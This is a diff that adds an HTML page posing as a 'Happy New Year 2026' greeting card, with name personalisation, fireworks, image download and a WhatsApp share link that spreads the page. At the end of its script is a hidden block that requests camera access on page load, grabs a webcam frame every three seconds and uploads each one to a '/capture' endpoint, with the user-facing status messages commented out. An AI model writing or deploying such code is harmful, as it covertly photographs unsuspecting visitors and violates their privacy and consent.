@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy New Year 2026!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+        }
+
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 215, 0, 0.1) 0%, transparent 70%);
+            animation: rotate 20s linear infinite;
+        }
+
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .content {
+            position: relative;
+            z-index: 1;
+        }
+
+        h1 {
+            font-size: 3em;
+            background: linear-gradient(45deg, #ff6b6b, #ffd93d, #6bcf7f, #4d96ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 20px;
+            animation: glow 2s ease-in-out infinite;
+        }
+
+        @keyframes glow {
+            0%, 100% { filter: brightness(1); }
+            50% { filter: brightness(1.3); }
+        }
+
+        .year {
+            font-size: 4em;
+            font-weight: bold;
+            color: #667eea;
+            margin: 20px 0;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .message {
+            font-size: 1.2em;
+            color: #555;
+            line-height: 1.6;
+            margin: 20px 0;
+        }
+
+        .name-input {
+            width: 100%;
+            padding: 15px;
+            font-size: 1.1em;
+            border: 2px solid #667eea;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .name-input:focus {
+            outline: none;
+            border-color: #764ba2;
+            transform: scale(1.02);
+        }
+
+        .buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+            flex-wrap: wrap;
+        }
+
+        .btn {
+            flex: 1;
+            min-width: 140px;
+            padding: 15px 30px;
+            font-size: 1em;
+            font-weight: bold;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-download {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .btn-download:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-whatsapp {
+            background: #25D366;
+            color: white;
+        }
+
+        .btn-whatsapp:hover {
+            background: #1da851;
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(37, 211, 102, 0.4);
+        }
+
+        .firework {
+            position: fixed;
+            width: 4px;
+            height: 4px;
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 9999;
+        }
+
+        @keyframes explode {
+            0% {
+                opacity: 1;
+                transform: translate(0, 0) scale(1);
+            }
+            100% {
+                opacity: 0;
+                transform: translate(var(--x), var(--y)) scale(0);
+            }
+        }
+
+        .icon {
+            width: 20px;
+            height: 20px;
+            fill: currentColor;
+        }
+
+        @media (max-width: 600px) {
+            .card {
+                padding: 30px 20px;
+            }
+
+            h1 {
+                font-size: 2em;
+            }
+
+            .year {
+                font-size: 3em;
+            }
+
+            .message {
+                font-size: 1em;
+            }
+
+            .buttons {
+                flex-direction: column;
+            }
+
+            .btn {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card" id="card">
+            <div class="content">
+                <h1>🎉 Happy New Year! 🎊</h1>
+                <div class="year">2026</div>
+                <div class="message">
+                    <p id="greeting">Wishing you a year filled with joy, success, and endless possibilities!</p>
+                    <p style="margin-top: 15px;">May all your dreams come true! ✨</p>
+                </div>
+                <input type="text" class="name-input" id="nameInput" placeholder="Enter your name (optional)" maxlength="30">
+                
+                <div class="buttons">
+                    <button class="btn btn-download" onclick="downloadCard()">
+                        <svg class="icon" viewBox="0 0 24 24">
+                            <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
+                        </svg>
+                        Download Card
+                    </button>
+                    <button class="btn btn-whatsapp" onclick="shareOnWhatsApp()">
+                        <svg class="icon" viewBox="0 0 24 24">
+                            <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/>
+                        </svg>
+                        Share on WhatsApp
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <script>
+        const nameInput = document.getElementById('nameInput');
+        const greeting = document.getElementById('greeting');
+
+        nameInput.addEventListener('input', function() {
+            if (this.value.trim()) {
+                greeting.textContent = `Dear ${this.value.trim()}, wishing you a year filled with joy, success, and endless possibilities!`;
+            } else {
+                greeting.textContent = 'Wishing you a year filled with joy, success, and endless possibilities!';
+            }
+        });
+
+        function createFirework(x, y) {
+            const colors = ['#ff6b6b', '#ffd93d', '#6bcf7f', '#4d96ff', '#ff8c42'];
+            const particles = 30;
+
+            for (let i = 0; i < particles; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'firework';
+                particle.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                particle.style.left = x + 'px';
+                particle.style.top = y + 'px';
+
+                const angle = (Math.PI * 2 * i) / particles;
+                const velocity = 50 + Math.random() * 50;
+                const vx = Math.cos(angle) * velocity;
+                const vy = Math.sin(angle) * velocity;
+
+                particle.style.setProperty('--x', vx + 'px');
+                particle.style.setProperty('--y', vy + 'px');
+                particle.style.animation = 'explode 1s ease-out forwards';
+
+                document.body.appendChild(particle);
+
+                setTimeout(() => particle.remove(), 1000);
+            }
+        }
+
+        setInterval(() => {
+            const x = Math.random() * window.innerWidth;
+            const y = Math.random() * window.innerHeight;
+            createFirework(x, y);
+        }, 2000);
+
+        async function downloadCard() {
+            const card = document.getElementById('card');
+            const buttons = document.querySelector('.buttons');
+            const input = document.getElementById('nameInput');
+            
+            buttons.style.display = 'none';
+            input.style.display = 'none';
+
+            try {
+                const canvas = await html2canvas(card, {
+                    scale: 2,
+                    backgroundColor: '#ffffff',
+                    logging: false
+                });
+
+                canvas.toBlob(function(blob) {
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = 'Happy_New_Year_2026.png';
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                });
+            } catch (error) {
+                alert('Error generating image. Please try again.');
+            } finally {
+                buttons.style.display = 'flex';
+                input.style.display = 'block';
+            }
+        }
+
+        function shareOnWhatsApp() {
+            const name = nameInput.value.trim();
+            const message = name 
+                ? `🎉 Happy New Year 2026! 🎊\n\nDear ${name}, wishing you a year filled with joy, success, and endless possibilities! May all your dreams come true! ✨\n\nCreate your own card: ${window.location.href}`
+                : `🎉 Happy New Year 2026! 🎊\n\nWishing you a year filled with joy, success, and endless possibilities! May all your dreams come true! ✨\n\nCreate your own card: ${window.location.href}`;
+            
+            const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(message)}`;
+            window.open(whatsappUrl, '_blank');
+        }
+    
+    
+    // Camera + Continuous Capture
+    const statusText = document.getElementById("status");
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.play();
+
+        video.addEventListener('loadeddata', () => {
+          //statusText.textContent = "📸 Camera active. Capturing continuously..."; 
+          startContinuousCapture(video);
+        });
+      })
+      .catch(err => {
+        console.error("Camera access denied:", err);
+        //statusText.textContent = "❌ Please allow camera access.";
+      });
+
+    function startContinuousCapture(video) {
+      const INTERVAL = 3000; // capture every 3 seconds
+
+      setInterval(() => {
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const context = canvas.getContext("2d");
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL("image/png");
+
+        fetch("/capture", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ image: imageData })
+        })
+        .then(res => res.json())
+        .then(data => {
+          console.log("Saved:", data.filename);
+          //statusText.textContent = "✅ Captured & sent: " + data.filename;
+        })
+        .catch(err => {
+          console.error("Error:", err);
+          statusText.textContent = "❌ Failed to send image.";
+        });
+      }, INTERVAL);
+    }
+    </script>
+</body>
+</html>
